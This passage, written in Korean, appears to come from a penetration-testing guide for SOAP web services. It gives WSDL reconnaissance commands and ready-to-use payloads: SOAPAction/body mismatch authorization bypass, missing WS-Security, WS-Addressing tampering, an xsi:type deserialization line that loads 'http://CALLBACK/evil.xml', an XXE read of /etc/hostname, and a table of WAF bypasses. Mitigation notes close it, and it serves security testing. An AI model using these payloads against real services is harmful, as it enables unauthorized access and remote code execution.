### Phase 2: 동적 테스트 (검증)

**정찰 페이로드:**

**WSDL/MEX endpoint 발견:**
```bash
curl "https://target/ws/service?wsdl"
curl "https://target/ws/service?singleWsdl"
curl "https://target/ws/service.asmx?wsdl"
curl "https://target/ws/service/mex"
curl "https://target/services?wsdl"
curl "https://target/api/soap?wsdl"
```

**SOAP endpoint 후보 경로:**
- `/ws/*`, `/services/*`, `/soap/*`, `/api/soap`
- `*.asmx` (ASP.NET)
- `/cxf/*` (Apache CXF)
- `/axis/*`, `/axis2/*` (Apache Axis)
- `/services/Service1`, `/services/Service1.svc` (.NET WCF)

**WSDL에서 operation/binding 추출:**
```bash
curl -s "https://target/ws/service?wsdl" | grep -oE 'name="[^"]+"' | head -50
# operation 이름, port type, binding 정보 수집
```

**Operation 권한 등급 추측:**
- 일반 op: `getInfo`, `searchUser`, `lookup`
- 권한 op: `deleteUser`, `setRole`, `adminUpdate`, `getAdminConfig`

---

**기본 페이로드:**

**SOAPAction vs Body 불일치 (핵심 우회):**
```xml
POST /ws/service
Content-Type: text/xml; charset=utf-8
SOAPAction: "getUserInfo"

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getAdminConfig xmlns="http://target/svc"/>  <!-- 권한 op (SOAPAction은 가벼운 op) -->
  </soap:Body>
</soap:Envelope>
```

**SOAP 1.2 Action (Content-Type 안 action 파라미터):**
```xml
POST /ws/service
Content-Type: application/soap+xml; charset=utf-8; action="getUserInfo"

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Body>
    <getAdminConfig xmlns="http://target/svc"/>
  </soap:Body>
</soap:Envelope>
```

**빈/누락 SOAPAction:**
```
SOAPAction: ""
SOAPAction: 
(SOAPAction 헤더 자체 누락)
```

**Namespace 변조:**
```xml
<soap:Body>
  <getUserInfo xmlns="http://different/ns"><userId>1</userId></getUserInfo>
</soap:Body>
```

**`xsi:type` 인젝션** (`TYPE_INJECTION` 라벨 — deserialization 결합):
```xml
<arg xsi:type="java.lang.Runtime">...</arg>
<arg xsi:type="org.springframework.context.support.ClassPathXmlApplicationContext">http://CALLBACK/evil.xml</arg>
```

**WS-Security 누락 (`NO_WSSEC` 라벨):**
```xml
<!-- UsernameToken/Timestamp/Signature 없이 권한 op 호출 -->
<soap:Envelope>
  <soap:Body>
    <deleteUser><id>1</id></deleteUser>
  </soap:Body>
</soap:Envelope>
```

**WS-Addressing wsa:Action 변조:**
```xml
<soap:Header>
  <wsa:Action xmlns:wsa="http://www.w3.org/2005/08/addressing">getAdminConfig</wsa:Action>
</soap:Header>
<soap:Body>
  <getUserInfo>...</getUserInfo>  <!-- wsa:Action과 Body 불일치 -->
</soap:Body>
```

**WS-Trust/WS-Federation 토큰 검증 우회:**
```xml
<!-- 토큰 없이 또는 임의 토큰으로 권한 op 호출 -->
<wst:RequestSecurityToken>...</wst:RequestSecurityToken>
```

**MTOM/XOP 첨부에 페이로드 숨김:**
```
Content-Type: multipart/related; type="application/xop+xml"; boundary=---
# 첨부에 악성 SOAP 본문
```

**XXE 결합 (xxe-scanner 영역이지만 SOAP에서 트리거):**
```xml
<?xml version="1.0"?>
<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<soap:Envelope>
  <soap:Body>&xxe;</soap:Body>
</soap:Envelope>
```

---

**우회 페이로드:**

| 방어 | 페이로드 |
|---|---|
| SOAPAction 인가만 | Body operation 변경 — 가벼운 op로 SOAPAction 통과 후 권한 op 호출 |
| SOAPAction case-sensitive | 백엔드 case-insensitive면 대소문자 변형 (`getuserinfo` vs `getUserInfo`) |
| WS-Security 서명 | XSW (XML Signature Wrapping) — 서명 노드와 파싱 노드 분리 (saml-scanner 결합) |
| `mustUnderstand=true` | 서버가 `mustUnderstand` 자체 미인식 시 silent skip |
| XML schema validation | `xsi:type` 다형성, XML encoding (UTF-7/UTF-16) |
| SOAPAction 따옴표 strict | `SOAPAction: op` (no quotes) vs `SOAPAction: "op"` 차이 |
| WAF SOAPAction 필터 | Body operation은 미검사 — Body 변경 |
| Endpoint URL 화이트리스트 | WSDL operation overloading — 같은 endpoint 다른 op |

**Encoding 변형:**
```xml
<!-- entity로 op 이름 분할 (일부 파서) -->
<get&#x55;serInfo>...

<!-- UTF-16 BOM -->
\xfe\xff<?xml version="1.0" encoding="UTF-16"?>...
```

---

**참고사항:**

- gateway/WAF는 SOAPAction만 검사하고 Body 미검사가 일반적 — Body operation 변경이 핵심 우회
- JAX-WS handler chain에서 SOAPAction == Body operation 검증 명시 필요
- Spring-WS `@PayloadRoot` 매칭 + 메서드 레벨 인가가 권장 패턴
- WSDL 비공개도 권장 — schema enumeration 차단
- WS-Addressing은 SOAP 1.2에서 SOAPAction 대체 가능 — 둘 다 검증 필요
- MTOM/XOP는 첨부에 페이로드 숨김 가능 — 본문만 검사하면 우회
- xsi:type 인젝션은 deserialization 영역 — deserialization-scanner 결합 (Java/.NET)
- SAML Token Profile (WS-Security)도 별도 검증 — saml-scanner 결합
- CXF/Axis MessageContext poisoning은 인터셉터 체인 신뢰 붕괴
- WSDL `?wsdl` 쿼리는 schema 노출 — operation 이름/parameter type 추론
- 메서드 레벨 `@RolesAllowed`/`@PreAuthorize` 누락 + 클래스 레벨만 적용 시 method-level 우회
- JAX-RPC 같은 레거시는 검증 약함 — JAX-WS 마이그레이션 권장
- ASMX (.asmx) 같은 .NET ASP.NET Web Services는 `[OperationContract]` 권한 누락 빈번
- WS-Trust 토큰 발행 endpoint는 약한 자격증명 + 광범위 권한 issue 가능
